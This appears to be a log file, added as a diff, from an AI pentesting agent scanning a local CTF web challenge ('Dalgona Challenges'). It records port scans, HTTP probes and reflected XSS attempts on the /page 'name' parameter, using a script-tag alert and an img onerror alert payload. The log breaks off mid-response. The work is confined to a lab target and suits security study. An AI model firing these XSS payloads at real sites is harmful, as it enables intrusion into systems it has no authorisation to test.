@@ -1,0 +1,1389 @@
+
+[STARTUP 2026-04-12T21:14:53.509Z] LOADING .env  →  mcp_server._app._load_dotenv
+[_app.py 21:14:53.515Z] importing FastMCP
+[_app.py 21:14:56.118Z] FastMCP imported OK
+[_app.py 21:14:56.119Z] importing core modules
+[_app.py 21:14:56.125Z] core modules imported OK
+[_app.py 21:14:56.125Z] instantiating FastMCP('pentest-agent')
+[_app.py 21:14:56.159Z] FastMCP instance created OK
+
+[STARTUP 2026-04-12T21:14:56.159Z] .env loaded OK
+[Sentry] SENTRY_DSN not set — error reporting disabled
+
+[STARTUP 2026-04-12T21:14:56.159Z] ENVIRONMENT SNAPSHOT
+  python      : 3.12.13 (main, Mar  4 2026, 09:23:07) [GCC 11.4.0]
+  platform    : Linux-5.15.0-174-generic-x86_64-with-glibc2.35
+  cwd         : /root/agent-smith
+  __file__    : /root/agent-smith/mcp_server/__main__.py
+  asyncio policy : _UnixDefaultEventLoopPolicy
+  event loop   : none running at startup (expected)
+
+[STARTUP 2026-04-12T21:14:56.163Z] IMPORTING  mcp_server.scan_tools
+[04/12/26 21:14:56] INFO     ====================================== logger.py:46
+                             ======================================             
+                             ====                                               
+                    INFO     SESSION_START  2026-04-12T21:14:56Z    logger.py:47
+
+[STARTUP 2026-04-12T21:14:56.186Z] OK         mcp_server.scan_tools
+
+[STARTUP 2026-04-12T21:14:56.186Z] IMPORTING  mcp_server.kali_tools
+
+[STARTUP 2026-04-12T21:14:56.190Z] OK         mcp_server.kali_tools
+
+[STARTUP 2026-04-12T21:14:56.190Z] IMPORTING  mcp_server.http_tools
+
+[STARTUP 2026-04-12T21:14:56.198Z] OK         mcp_server.http_tools
+
+[STARTUP 2026-04-12T21:14:56.198Z] IMPORTING  mcp_server.report_tools
+
+[STARTUP 2026-04-12T21:14:56.208Z] OK         mcp_server.report_tools
+
+[STARTUP 2026-04-12T21:14:56.208Z] IMPORTING  mcp_server.session_tools
+
+[STARTUP 2026-04-12T21:14:56.222Z] OK         mcp_server.session_tools
+
+[STARTUP 2026-04-12T21:14:56.222Z] AUDITING registered tools
+
+[STARTUP 2026-04-12T21:14:56.222Z] Tools registered: 5  (see logs/tools_registered.log)
+
+[STARTUP 2026-04-12T21:14:56.222Z] DOCKER IMAGE PREFLIGHT CHECK
+  [OK]      instrumentisto/nmap@sha256:96f6ed194519b62421a1a1c57809e65a7f94d2aa1c8c25676f247e5e148c0827
+  [OK]      projectdiscovery/naabu@sha256:4b28540e4de8209ba5f499f704f43f6f780dfd5b19e97533d44053bfb309da5b
+  [OK]      projectdiscovery/httpx@sha256:043677c2c4ec10d8ba5e01d82eb368a29f54348893a391b8e95b7119b41db292
+  [OK]      projectdiscovery/subfinder@sha256:5e62f2c278b6b32c957b8afd6bbefaed3e1ae0fd5b3c67a4d08eb15c65531399
+  [MISSING] projectdiscovery/nuclei@sha256:cd763beb886f99dbac2526847431059077d67cda77c51bfae73f45987cc5fd92  — will pull on first use
+  [MISSING] semgrep/semgrep@sha256:3dab091ee3247fce7e4ed3df9f92b3bd72692c083295f53cec3f135b86404db1  — will pull on first use
+  [MISSING] trufflesecurity/trufflehog@sha256:d30c74906d19a1c7e3021d9d615e245bf159acece38bbc269c5dde9a8d775480  — will pull on first use
+
+[STARTUP 2026-04-12T21:14:56.354Z] PREFLIGHT: 4/7 images ready. Run 'docker pull' or session(action='pull_images') for: projectdiscovery/nuclei@sha256:cd763beb886f99dbac2526847431059077d67cda77c51bfae73f45987cc5fd92, semgrep/semgrep@sha256:3dab091ee3247fce7e4ed3df9f92b3bd72692c083295f53cec3f135b86404db1, trufflesecurity/trufflehog@sha256:d30c74906d19a1c7e3021d9d615e245bf159acece38bbc269c5dde9a8d775480
+
+[STARTUP 2026-04-12T21:14:56.354Z] PATCHING MCP SDK for ClosedResourceError resilience
+
+[STARTUP 2026-04-12T21:14:56.354Z] MCP SDK patched OK
+
+[STARTUP 2026-04-12T21:14:56.354Z] CALLING mcp.run()  — server handshake begins now
+                    INFO     Processing request of type            server.py:720
+                             ListToolsRequest                                   
+                    INFO     Processing request of type            server.py:720
+                             ListPromptsRequest                                 
+                    INFO     Processing request of type            server.py:720
+                             ListResourcesRequest                               
+                    INFO     Processing request of type            server.py:720
+                             ListResourceTemplatesRequest                       
+[04/12/26 21:15:35] INFO     Processing request of type            server.py:720
+                             CallToolRequest                                    
+                    INFO     NOTE         Scan started —            logger.py:84
+                             target=http://172.17.0.1:49471                     
+                             depth=thorough  limits: $100.0 /                   
+                             480min / 0 calls                                   
+[04/12/26 21:15:37] INFO     Processing request of type            server.py:720
+                             CallToolRequest                                    
+[04/12/26 21:15:38] INFO     TOOL_CALL    dashboard                 logger.py:56
+                             args={"port": 5000}                                
+[04/12/26 21:15:39] INFO     TOOL_RESULT  dashboard                 logger.py:61
+                             http://localhost:5000                              
+                             ──────────────────────────────────────             
+                             ──────────────────────────────────────             
+                             ────                                               
+                    INFO     Processing request of type            server.py:720
+                             CallToolRequest                                    
+                    INFO     TOOL_CALL    naabu                     logger.py:56
+                             args={"host": "172.17.0.1", "ports":               
+                             "top-100", "flags": ""}                            
+[04/12/26 21:15:44] DEBUG    RAW_STDOUT   naabu                     logger.py:67
+                             {"ip":"172.17.0.1","timestamp":"2026-0             
+                             4-12T21:15:41.580471972Z","port":5000,             
+                             "protocol":"tcp","tls":false}                      
+                             {"ip":"172.17.0.1","timestamp":"2026-0             
+                             4-12T21:15:41.58189353Z","port":22,"pr             
+                             otocol":"tcp","tls":false}                         
+                             {"ip":"172.17.0.1","timestamp":"2026-0             
+                             4-12T21:15:43.603048463Z","port":5000,             
+                             "protocol":"tcp","tls":false}                      
+                             {"ip":"172.17.0.1","timestamp":"2026-0             
+                             4-12T21:15:43.603086112Z","port":22,"p             
+                             rotocol":"tcp","tls":false}                        
+                                                                                
+                    DEBUG    RAW_STDERR   naabu                     logger.py:69
+                                                                                
+                                               __                               
+                               ___  ___  ___ _/ /  __ __                        
+                              / _ \/ _ \/ _ \/ _ \/ // /                        
+                             /_//_/\_,_/\_,_/_.__/\_,_/                         
+                                                                                
+                                             projectdiscovery.io                
+                                                                                
+                             [[34mINF[0m] Current naabu version                 
+                             2.5.0 ([92mlatest[0m)                              
+                             [[93mWRN[0m] UI Dashboard is disabled,             
+                             Use -dashboard option to enable                    
+                             [[34mINF[0m] Running CONNECT scan with             
+                             non root privileges                                
+                             [[34mINF[0m] Found 2 ports on host                 
+                             172.17.0.1 (172.17.0.1)                            
+                                                                                
+                    INFO     TOOL_RESULT  naabu                     logger.py:61
+                             {"ip":"172.17.0.1","timestamp":"2026-0             
+                             4-12T21:15:41.580471972Z","port":5000,             
+                             "protocol":"tcp","tls":false}                      
+                             {"ip":"172.17.0.1","timestamp":"2026-0             
+                             4-12T21:15:41.58189353Z","port":22,"pr             
+                             otocol":"tcp","tls":false}                         
+                             {"ip":"172.17.0.1","timestamp":"2026-0             
+                             4-12T21:15:43.603048463Z","port":5000,             
+                             "protocol":"tcp","tls":false}                      
+                             {"ip":"172.17.0.1","timestamp":"2026-0             
+                             4-12T21:15:43.603086112Z","port":22,"p             
+                             rotocol":"tcp","tls":false}                        
+                                                                                
+                             ──────────────────────────────────────             
+                             ──────────────────────────────────────             
+                             ────                                               
+[04/12/26 21:15:49] INFO     Processing request of type            server.py:720
+                             CallToolRequest                                    
+                    INFO     NOTE         Naabu top-100 found ports logger.py:84
+                             22 (SSH) and 5000 on 172.17.0.1.                   
+                             Target is on non-standard port 49471.              
+                             Running httpx probe on the target and              
+                             nmap to confirm service details.                   
+                    INFO     Processing request of type            server.py:720
+                             CallToolRequest                                    
+                    INFO     TOOL_CALL    httpx                     logger.py:56
+                             args={"url":                                       
+                             "http://172.17.0.1:49471", "flags":                
+                             ""}                                                
+[04/12/26 21:15:52] DEBUG    RAW_STDOUT   httpx                     logger.py:67
+                             {"timestamp":"2026-04-12T21:15:51.8588             
+                             92315Z","port":"49471","url":"http://1             
+                             72.17.0.1:49471","input":"http://172.1             
+                             7.0.1:49471","title":"Dalgona                      
+                             Challenges","scheme":"http","webserver             
+                             ":"Werkzeug/3.1.8                                  
+                             Python/3.11.15","content_type":"text/h             
+                             tml","method":"GET","host":"172.17.0.1             
+                             ","host_ip":"172.17.0.1","path":"/","t             
+                             ime":"3.057956ms","a":["172.17.0.1"],"             
+                             tech":["Flask:3.1.8","Python:3.11.15"]             
+                             ,"words":353,"lines":28,"status_code":             
+                             200,"content_length":1090,"failed":fal             
+                             se,"knowledgebase":{"pHash":0}}                    
+                                                                                
+                    DEBUG    RAW_STDERR   httpx                     logger.py:69
+                                                                                
+                                 __    __  __       _  __                       
+                                / /_  / /_/ /_____ | |/ /                       
+                               / __ \/ __/ __/ __ \|   /                        
+                              / / / / /_/ /_/ /_/ /   |                         
+                             /_/ /_/\__/\__/ .___/_/|_|                         
+                                          /_/                                   
+                                                                                
+                                             projectdiscovery.io                
+                                                                                
+                             [[34mINF[0m] Current httpx version                 
+                             v1.9.0 ([92mlatest[0m)                             
+                             [[93mWRN[0m] UI Dashboard is disabled,             
+                             Use -dashboard option to enable                    
+                                                                                
+                    INFO     TOOL_RESULT  httpx                     logger.py:61
+                             {"timestamp":"2026-04-12T21:15:51.8588             
+                             92315Z","port":"49471","url":"http://1             
+                             72.17.0.1:49471","input":"http://172.1             
+                             7.0.1:49471","title":"Dalgona                      
+                             Challenges","scheme":"http","webserver             
+                             ":"Werkzeug/3.1.8                                  
+                             Python/3.11.15","content_type":"text/h             
+                             tml","method":"GET","host":"172.17.0.1             
+                             ","host_ip":"172.17.0.1","path":"/","t             
+                             ime":"3.057956ms","a":["172.17.0.1"],"             
+                             tech":["Flask:3.1.8","Python:3.11.15"]             
+                             ,"words":353,"lines":28,"status_code":             
+                             200,"content_length":1090,"failed":fal             
+                             se,"knowledgebase":{"pHash":0}}                    
+                                                                                
+                             ──────────────────────────────────────             
+                             ──────────────────────────────────────             
+                             ────                                               
+[04/12/26 21:15:56] INFO     Processing request of type            server.py:720
+                             CallToolRequest                                    
+                    INFO     NOTE         Target identified: Flask  logger.py:84
+                             3.1.8 / Python 3.11.15 / Werkzeug                  
+                             3.1.8. Site title: 'Dalgona                        
+                             Challenges'. This is clearly a CTF web             
+                             challenge app. Running spider and ffuf             
+                             in parallel to map the attack surface.             
+                             XSS hint means I need to find a                    
+                             reflected/stored XSS vector.                       
+[04/12/26 21:15:59] INFO     Processing request of type            server.py:720
+                             CallToolRequest                                    
+                    INFO     TOOL_CALL    http_request              logger.py:56
+                             args={"url":                                       
+                             "http://172.17.0.1:49471", "method":               
+                             "GET", "poc": false}                               
+                    INFO     TOOL_RESULT  http_request              logger.py:61
+                             {                                                  
+                               "status": 200,                                   
+                               "headers": {                                     
+                                 "Server": "Werkzeug/3.1.8                      
+                             Python/3.11.15",                                   
+                                 "Date": "Sun, 12 Apr 2026 21:15:59             
+                             GMT",                                              
+                                 "Content-Type": "text/html;                    
+                             charset=utf-8",                                    
+                                 "Content-Length": "1090",                      
+                                 "Connection": "close"                          
+                               },                                               
+                               "body": "\n    \t<html>\n                        
+                             <head>\n            <link                          
+                             rel=\"shortcut icon\"                              
+                             href=\"static/assets/fav-icon.png\">\n             
+                             <link rel=\"stylesheet\"                           
+                             type=\"text/css\"                                  
+                             href=\"static/css/style.css\">\n                   
+                             <link rel=\"stylesheet\"                           
+                             type=\"text/css\"                                  
+                             href=\"static/css/xss/index.css\">\n               
+                             <title>Dalgona Challenges</title>\n                
+                             </head>\n\n\t        <article                      
+                             class=\"widget widget__login\">\n\t                
+                             <div class=\"widget__content\">\n\t                
+                             \t\t<div class=\"box\">\n\t                        
+                             <form class=\"box-form\">\n\t                      
+                             <img class=\"text-img\"                            
+                             src=\"static/img/logo5_white.png\">\n\             
+                             t\t\t\t        <h1>Dalgona                         
+                             Challenges</h1>\n\t                                
+                             <div class=\"init-table\">\n                       
+                             <div class=\"row\">\n                              
+                             <div class=\"column\"><a                           
+                             class=\"text\" type=text                           
+                             href=\"page\"><img                                 
+                             src=\"static/img/cookies/new_star.png\             
+                             " alt=\"Star\" width=\"150\"                       
+                             height=\"150\">Page</a></div>\n\t\t\t\             
+                             t            </div>\n                              
+                             </br>\n\t\t\t\t                                    
+                             </div>\n\t\t\t\t                                   
+                             </br>\n\t\t\t\t        </br>\n\t\t\t\t             
+                             <p></p>\n\t                </form>\n\t             
+                             </br>\n\t\t\t\t</div>\n\t                          
+                             </div>\n\t    </html>\n",                          
+                               "burp": "not routed through Burp"                
+                             }                                                  
+                             ──────────────────────────────────────             
+                             ──────────────────────────────────────             
+                             ────                                               
+                    INFO     Processing request of type            server.py:720
+                             CallToolRequest                                    
+                    INFO     TOOL_CALL    spider                    logger.py:56
+                             args={"url":                                       
+                             "http://172.17.0.1:49471", "depth":                
+                             "3", "flags": ""}                                  
+[04/12/26 21:20:38] INFO     TOOL_RESULT  spider                    logger.py:61
+                             http://172.17.0.1:49471                            
+                             http://172.17.0.1:49471/static/css/xss             
+                             /index.css                                         
+                             http://172.17.0.1:49471/static/css/sty             
+                             le.css                                             
+                             http://172.17.0.1:49471/page                       
+                             http://172.17.0.1:49471/static/css/xss             
+                             /xss21.css                                         
+                             ──────────────────────────────────────             
+                             ──────────────────────────────────────             
+                             ────                                               
+[04/12/26 21:20:40] INFO     Processing request of type            server.py:720
+                             CallToolRequest                                    
+                    INFO     TOOL_CALL    http_request              logger.py:56
+                             args={"url":                                       
+                             "http://172.17.0.1:49471/page",                    
+                             "method": "GET", "poc": false}                     
+[04/12/26 21:20:43] INFO     TOOL_RESULT  http_request              logger.py:61
+                             {                                                  
+                               "status": 200,                                   
+                               "headers": {                                     
+                                 "Server": "Werkzeug/3.1.8                      
+                             Python/3.11.15",                                   
+                                 "Date": "Sun, 12 Apr 2026 21:20:43             
+                             GMT",                                              
+                                 "Content-Type": "text/html;                    
+                             charset=utf-8",                                    
+                                 "Content-Length": "894",                       
+                                 "X-XSS-Protection": "0",                       
+                                 "Connection": "close"                          
+                               },                                               
+                               "body": "\n    <html>\n                          
+                             <head>\n            <link                          
+                             rel=\"shortcut icon\"                              
+                             href=\"static/assets/fav-icon.png\">\n             
+                             <link rel=\"stylesheet\"                           
+                             type=\"text/css\"                                  
+                             href=\"static/css/style.css\">\n                   
+                             <link rel=\"stylesheet\"                           
+                             type=\"text/css\"                                  
+                             href=\"static/css/xss/xss21.css\">\n               
+                             <title>Dalgona - Star</title>\n                    
+                             </head>\n\n        <article                        
+                             class=\"widget widget__login\">\n                  
+                             <div class=\"widget__content\">\n                  
+                             <div class=\"box\">\n                              
+                             <form class=\"box-form\">\n                        
+                             <img class=\"text-img\"                            
+                             src=\"static/img/logo5_white.png\">\n              
+                             \n                    <div                         
+                             class=\"solution-text\"><img                       
+                             src=\"static/img/cookies/new_star.png\             
+                             " alt=\"Start\" width=\"150\"                      
+                             height=\"150\"><br>Let the game begin.             
+                             Good Luck</div>\n                                  
+                             <input type=text name=name                         
+                             placeholder=\"Enter your name...\" >\n             
+                             </form>\n            </div>\n                      
+                             </div>\n    </html>\n",                            
+                               "burp": "not routed through Burp"                
+                             }                                                  
+                             ──────────────────────────────────────             
+                             ──────────────────────────────────────             
+                             ────                                               
+                    INFO     Processing request of type            server.py:720
+                             CallToolRequest                                    
+                    INFO     TOOL_CALL    ffuf                      logger.py:56
+                             args={"url":                                       
+                             "http://172.17.0.1:49471", "wordlist":             
+                             "common.txt", "extensions":                        
+                             ".txt,.php,.html,.js,.json,.py,.bak,.o             
+                             ld,.conf,.xml,.env,.log", "flags": ""}             
+                    INFO     TOOL_RESULT  ffuf                      logger.py:61
+                             Fuzz Faster U Fool - v2.1.0-dev                    
+                                                                                
+                             HTTP OPTIONS:                                      
+                               -H                  Header `"Name:               
+                             Value"`, separated by colon. Multiple              
+                             -H flags are accepted.                             
+                               -X                  HTTP method to               
+                             use                                                
+                               -b                  Cookie data                  
+                             `"NAME1=VALUE1; NAME2=VALUE2"` for                 
+                             copy as curl functionality.                        
+                               -cc                 Client cert for              
+                             authentication. Client key needs to be             
+                             defined as well for this to work                   
+                               -ck                 Client key for               
+                             authentication. Client certificate                 
+                             needs to be defined as well for this               
+                             to work                                            
+                               -d                  POST data                    
+                               -http2              Use HTTP2                    
+                             protocol (default: false)                          
+                               -ignore-body        Do not fetch the             
+                             response content. (default: false)                 
+                               -r                  Follow redirects             
+                             (default: false)                                   
+                               -raw                Do not encode                
+                             URI (default: false)                               
+                               -recursion          Scan                         
+                             recursively. Only FUZZ keyword is                  
+                             supported, and URL (-u) has to end in              
+                             it. (default: false)                               
+                               -recursion-depth    Maximum                      
+                             recursion depth. (default: 0)                      
+                               -recursion-strategy Recursion                    
+                             strategy: "default" for a redirect                 
+                             based, and "greedy" to recurse on all              
+                             matches (default: default)                         
+                               -replay-proxy       Replay matched               
+                             requests using this proxy.                         
+                               -sni                Target TLS SNI,              
+                             does not support FUZZ keyword                      
+                               -timeout            HTTP request                 
+                             timeout in seconds. (default: 10)                  
+                               -u                  Target URL                   
+                               -x                  Proxy URL                    
+                             (SOCKS5 or HTTP). For example:                     
+                             http://127.0.0.1:8080 or                           
+                             socks5://127.0.0.1:8080                            
+                                                                                
+                             GENERAL OPTIONS:                                   
+                               -V                  Show version                 
+                             information. (default: false)                      
+                               -ac                 Automatically                
+                             calibrate filtering options (default:              
+                             false)                                             
+                               -acc                Custom                       
+                             auto-calibration string. Can be used               
+                             multiple times. Implies -ac                        
+                               -ach                Per host                     
+                             autocalibration (default: false)                   
+                               -ack                Autocalibration              
+                             keyword (default: FUZZ)                            
+                               -acs                Custom                       
+                             auto-calibration strategies. Can be                
+                             used multiple times. Implies -ac                   
+                               -c                  Colorize output.             
+                             (default: false)                                   
+                               -config             Load                         
+                             configuration from a file                          
+                               -json               JSON output,                 
+                             printing newline-delimited JSON                    
+                             records (default: false)                           
+                               -maxtime            Maximum running              
+                             time in seconds for entire process.                
+                             (default: 0)                                       
+                               -maxtime-job        Maximum running              
+                             time in seconds per job. (default: 0)              
+                               -noninteractive     Disable the                  
+                             interactive console functionality                  
+                             (default: false)                                   
+                               -p                  Seconds of                   
+                             `delay` between requests, or a range               
+                             of random delay. For example "0.1" or              
+                             "0.1-2.0"                                          
+                               -rate               Rate of requests             
+                             per second (default: 0)                            
+                               -s                  Do not print                 
+                             additional information (silent mode)               
+                             (default: false)                                   
+                               -sa                 Stop on all                  
+                             error cases. Implies -sf and -se.                  
+                             (default: false)                                   
+                               -scraperfile        Custom scraper               
+                             file path                                          
+                               -scrapers           Active scraper               
+                             groups (default: all)                              
+                               -se                 Stop on spurious             
+                             errors (default: false)                            
+                               -search             Search for a                 
+                             FFUFHASH payload from ffuf history                 
+                               -sf                 Stop when > 95%              
+                             of responses return 403 Forbidden                  
+                             (default: false)                                   
+                               -t                  Number of                    
+                             concurrent threads. (default: 40)                  
+                               -v                  Verbose output,              
+                             printing full URL and redirect                     
+                             location (if any) with the results.                
+                             (default: false)                                   
+                                                                                
+                             MATCHER OPTIONS:                                   
+                               -mc                 Match HTTP                   
+                             status codes, or "all" for everything.             
+                             (default:                                          
+                             200-299,301,302,307,401,403,405,500)               
+                               -ml                 Match amount of              
+                             lines in response                                  
+                               -mmode              Matcher set                  
+                             operator. Either of: and, or (default:             
+                             or)                                                
+                               -mr                 Match regexp                 
+                               -ms                 Match HTTP                   
+                             response size                                      
+                               -mt                 Match how many               
+                             milliseconds to the first response                 
+                             byte, either greater or less than. EG:             
+                             >100 or <100                                       
+                               -mw                 Match amount of              
+                             words in response                                  
+                                                                                
+                             FILTER OPTIONS:                                    
+                               -fc                 Filter HTTP                  
+                             status codes from response. Comma                  
+                             separated list of codes and ranges                 
+                               -fl                 Filter by amount             
+                             of lines in response. Comma separated              
+                             list of line counts and ranges                     
+                               -fmode              Filter set                   
+                             operator. Either of: and, or (default:             
+                             or)                                                
+                               -fr                 Filter regexp                
+                               -fs                 Filter HTTP                  
+                             response size. Comma separated list of             
+                             sizes and ranges                                   
+                               -ft                 Filter by number             
+                             of milliseconds to the first response              
+                             byte, either greater or less than. EG:             
+                             >100 or <100                                       
+                               -fw                 Filter by amount             
+                             of words in response. Comma separated              
+                             list of word counts and ranges                     
+                                                                                
+                             INPUT OPTIONS:                                     
+                               -D                  DirSearch                    
+                             wordlist compatibility mode. Used in               
+                             conjunction with -e flag. (default:                
+                             false)                                             
+                               -e                  Comma separated              
+                             list of extensions. Extends FUZZ                   
+                             keyword.                                           
+                               -enc                Encoders for                 
+                             keywords, eg. 'FUZZ:urlencode                      
+                             b64encode'                                         
+                               -ic                 Ignore wordlist              
+                             comments (default: false)                          
+                               -input-cmd          Command                      
+                             producing the input. --input-num is                
+                             required when using this input method.             
+                             Overrides -w.                                      
+                               -input-num          Number of inputs             
+                             to test. Used in conjunction with                  
+                             --input-cmd. (default: 100)                        
+                               -input-shell        Shell to be used             
+                             for running command                                
+                               -mode               Multi-wordlist               
+                             operation mode. Available modes:                   
+                             clusterbomb, pitchfork, sniper                     
+                             (default: clusterbomb)                             
+                               -request            File containing              
+                             the raw http request                               
+                               -request-proto      Protocol to use              
+                             along with raw request (default:                   
+                             https)                                             
+                               -w                  Wordlist file                
+                             path and (optional) keyword separated              
+                             by colon. eg.                                      
+                             '/path/to/wordlist:KEYWORD'                        
+                                                                                
+                             OUTPUT OPTIONS:                                    
+                               -debug-log          Write all of the             
+                             internal logging to the specified                  
+                             file.                                              
+                               -o                  Write output to              
+                             file                                               
+                               -od                 Directory path               
+                             to store matched results to.                       
+                               -of                 Output file                  
+                             format. Available formats: json,                   
+                             ejson, html, md, csv, ecsv (or, 'all'              
+                             for all formats) (default: json)                   
+                               -or                 Don't create the             
+                             output file if we don't have results               
+                             (default: false)                                   
+                                                                                
+                             EXAMPLE USAGE:                                     
+                               Fuzz file paths from wordlist.txt,               
+                             match all responses but filter out                 
+                             those with content-size 42.                        
+                               Colored, verbose output.                         
+                                 ffuf -w wordlist.txt -u                        
+                             https://example.org/FUZZ -mc all -fs               
+                             42 -c -v                                           
+                                                                                
+                               Fuzz Host-header, match HTTP 200                 
+                             responses.                                         
+                                 ffuf -w hosts.txt -u                           
+                             https://example.org/ -H "Host: FUZZ"               
+                             -mc 200                                            
+                                                                                
+                               Fuzz POST JSON data. Match all                   
+                             responses not containing text "error".             
+                                 ffuf -w entries.txt -u                         
+                             https://example.org/ -X POST -H                    
+                             "Content-Type: application/json" \                 
+                                   -d '{"name": "FUZZ",                         
+                             "anotherkey": "anothervalue"}' -fr                 
+                             "error"                                            
+                                                                                
+                               Fuzz multiple locations. Match only              
+                             responses reflecting the value of                  
+                             "VAL" keyword. Colored.                            
+                                 ffuf -w params.txt:PARAM -w                    
+                             values.txt:VAL -u                                  
+                             https://example.org/?PARAM=VAL -mr                 
+                             "VAL" -c                                           
+                                                                                
+                               More information and examples:                   
+                             https://github.com/ffuf/ffuf                       
+                                                                                
+                                                                                
+                             Encountered error(s): 1 errors                     
+                             occurred.                                          
+                                     * stat                                     
+                             /usr/share/mcp-kali-server/common.txt:             
+                             no such file or directory                          
+                                                                                
+                             Encountered error(s): 1 errors                     
+                             occurred.                                          
+                                     * stat                                     
+                             /usr/share/mcp-kali-server/common.txt:             
+                             no such file or directory                          
+                             ──────────────────────────────────────             
+                             ──────────────────────────────────────             
+                             ────                                               
+[04/12/26 21:20:51] INFO     Processing request of type            server.py:720
+                             CallToolRequest                                    
+                    INFO     NOTE         Key finding: /page        logger.py:84
+                             returns X-XSS-Protection: 0 header —               
+                             XSS protection explicitly disabled!                
+                             Form has 'input type=text name=name'.              
+                             This is the XSS injection point.                   
+                             Testing reflected XSS via GET/POST                 
+                             with name parameter.                               
+[04/12/26 21:20:53] INFO     Processing request of type            server.py:720
+                             CallToolRequest                                    
+                    INFO     TOOL_CALL    http_request              logger.py:56
+                             args={"url":                                       
+                             "http://172.17.0.1:49471/page?name=tes             
+                             t", "method": "GET", "poc": false}                 
+[04/12/26 21:20:55] INFO     TOOL_RESULT  http_request              logger.py:61
+                             {                                                  
+                               "status": 200,                                   
+                               "headers": {                                     
+                                 "Server": "Werkzeug/3.1.8                      
+                             Python/3.11.15",                                   
+                                 "Date": "Sun, 12 Apr 2026 21:20:55             
+                             GMT",                                              
+                                 "Content-Type": "text/html;                    
+                             charset=utf-8",                                    
+                                 "Content-Length": "890",                       
+                                 "X-XSS-Protection": "0",                       
+                                 "Connection": "close"                          
+                               },                                               
+                               "body": "\n    <html>\n                          
+                             <head>\n            <link                          
+                             rel=\"shortcut icon\"                              
+                             href=\"static/assets/fav-icon.png\">\n             
+                             <link rel=\"stylesheet\"                           
+                             type=\"text/css\"                                  
+                             href=\"static/css/style.css\">\n                   
+                             <link rel=\"stylesheet\"                           
+                             type=\"text/css\"                                  
+                             href=\"static/css/xss/xss21.css\">\n               
+                             <title>Dalgona - Star</title>\n                    
+                             </head>\n\n        <article                        
+                             class=\"widget widget__login\">\n                  
+                             <div class=\"widget__content\">\n                  
+                             <div class=\"box\">\n                              
+                             <form class=\"box-form\">\n                        
+                             <img class=\"text-img\"                            
+                             src=\"static/img/logo5_white.png\">\n              
+                             \n                    <div                         
+                             class=\"solution-text\"><img                       
+                             src=\"static/img/cookies/error_star.pn             
+                             g\" alt=\"Fail\" width=\"150\"                     
+                             height=\"150\"><br>Failed! Try                     
+                             again!</div>\n                                     
+                             <input type=text name=name                         
+                             placeholder=\"Enter your name...\" >               
+                             test>\n                </form>\n                   
+                             </div>\n        </div>\n                           
+                             </html>\n",                                        
+                               "burp": "not routed through Burp"                
+                             }                                                  
+                             ──────────────────────────────────────             
+                             ──────────────────────────────────────             
+                             ────                                               
+                    INFO     Processing request of type            server.py:720
+                             CallToolRequest                                    
+                    INFO     TOOL_CALL    http_request              logger.py:56
+                             args={"url":                                       
+                             "http://172.17.0.1:49471/page",                    
+                             "method": "POST", "poc": false}                    
+                    INFO     TOOL_RESULT  http_request              logger.py:61
+                             {                                                  
+                               "status": 405,                                   
+                               "headers": {                                     
+                                 "Server": "Werkzeug/3.1.8                      
+                             Python/3.11.15",                                   
+                                 "Date": "Sun, 12 Apr 2026 21:20:55             
+                             GMT",                                              
+                                 "Content-Type": "text/html;                    
+                             charset=utf-8",                                    
+                                 "Allow": "HEAD, OPTIONS, GET",                 
+                                 "Content-Length": "153",                       
+                                 "Connection": "close"                          
+                               },                                               
+                               "body": "<!doctype html>\n<html                  
+                             lang=en>\n<title>405 Method Not                    
+                             Allowed</title>\n<h1>Method Not                    
+                             Allowed</h1>\n<p>The method is not                 
+                             allowed for the requested URL.</p>\n",             
+                               "burp": "not routed through Burp"                
+                             }                                                  
+                             ──────────────────────────────────────             
+                             ──────────────────────────────────────             
+                             ────                                               
+[04/12/26 21:21:08] INFO     Processing request of type            server.py:720
+                             CallToolRequest                                    
+                    INFO     TOOL_CALL    http_request              logger.py:56
+                             args={"url":                                       
+                             "http://172.17.0.1:49471/page?name=%3C             
+                             script%3Ealert%28%27XSS%27%29%3C%2Fscr             
+                             ipt%3E", "method": "GET", "poc":                   
+                             false}                                             
+                    INFO     TOOL_RESULT  http_request              logger.py:61
+                             {                                                  
+                               "status": 200,                                   
+                               "headers": {                                     
+                                 "Server": "Werkzeug/3.1.8                      
+                             Python/3.11.15",                                   
+                                 "Date": "Sun, 12 Apr 2026 21:21:08             
+                             GMT",                                              
+                                 "Content-Type": "text/html;                    
+                             charset=utf-8",                                    
+                                 "Content-Length": "811",                       
+                                 "Connection": "close"                          
+                               },                                               
+                               "body": "\n    <html>\n                          
+                             <head>\n            <link                          
+                             rel=\"shortcut icon\"                              
+                             href=\"static/assets/fav-icon.png\">\n             
+                             <link rel=\"stylesheet\"                           
+                             type=\"text/css\"                                  
+                             href=\"static/css/style.css\">\n                   
+                             <link rel=\"stylesheet\"                           
+                             type=\"text/css\"                                  
+                             href=\"static/css/xss/xss21.css\">\n               
+                             <title>Dalgona - Star</title>\n                    
+                             </head>\n\n        <article                        
+                             class=\"widget widget__login\">\n                  
+                             <div class=\"widget__content\">\n                  
+                             <div class=\"box\">\n                              
+                             <form class=\"box-form\">\n                        
+                             <img class=\"text-img\"                            
+                             src=\"static/img/logo5_white.png\">\n              
+                             <div class=\"solution-text\">Sorry you             
+                             can't use: 'script'</div>\n                        
+                             \n                    <input type=text             
+                             name=name placeholder=\"Enter your                 
+                             name...\" >>\n                                     
+                             </form>\n            </div>\n                      
+                             </div>\n    </html>\n",                            
+                               "burp": "not routed through Burp"                
+                             }                                                  
+                             ──────────────────────────────────────             
+                             ──────────────────────────────────────             
+                             ────                                               
+[04/12/26 21:21:14] INFO     Processing request of type            server.py:720
+                             CallToolRequest                                    
+                    INFO     TOOL_CALL    http_request              logger.py:56
+                             args={"url":                                       
+                             "http://172.17.0.1:49471/page?name=%3C             
+                             img+src%3Dx+onerror%3Dalert%28%27XSS%2             
+                             7%29%3E", "method": "GET", "poc":                  
+                             false}                                             
+                    INFO     TOOL_RESULT  http_request              logger.py:61
+                             {                                                  
+                               "status": 200,                                   
+                               "headers": {                                     
+                                 "Server": "Werkzeug/3.1.8                      
+                             Python/3.11.15",                                   
+                                 "Date": "Sun, 12 Apr 2026 21:21:14             
+                             GMT",                                              
+                                 "Content-Type": "text/html;                    
+                             charset=utf-8",                                    
+                                 "Content-Length": "812",                       
+                                 "Connection": "close"                          
+                               },                                               
+                               "body": "\n    <html>\n                          
+                             <head>\n            <link                          
+                             rel=\"shortcut icon\"                              
+                             href=\"static/assets/fav-icon.png\">\n             
+                             <link rel=\"stylesheet\"                           
+                             type=\"text/css\"                                  
+                             href=\"static/css/style.css\">\n                   
+                             <link rel=\"stylesheet\"                           
+                             type=\"text/css\"                                  
+                             href=\"static/css/xss/xss21.css\">\n               
